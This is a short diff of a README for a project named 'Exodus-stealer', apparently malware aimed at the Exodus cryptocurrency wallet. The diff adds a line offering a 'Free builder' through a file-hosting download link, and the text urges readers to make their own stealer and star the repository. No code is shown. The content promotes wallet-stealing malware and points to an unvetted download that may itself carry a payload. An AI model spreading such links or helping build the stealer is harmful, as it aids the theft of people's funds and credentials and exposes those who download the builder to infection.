@@ -1,4 +1,4 @@
-# Exodus-stealer
+# Exodus-stealer Free builder here: https://gofile.io/d/MUKzVy
 MAKE U OWN STEALER - SOURCE !! 🚀
 STARR FOR MORE UPDATES ❤️
 🎄 Auto setup done!
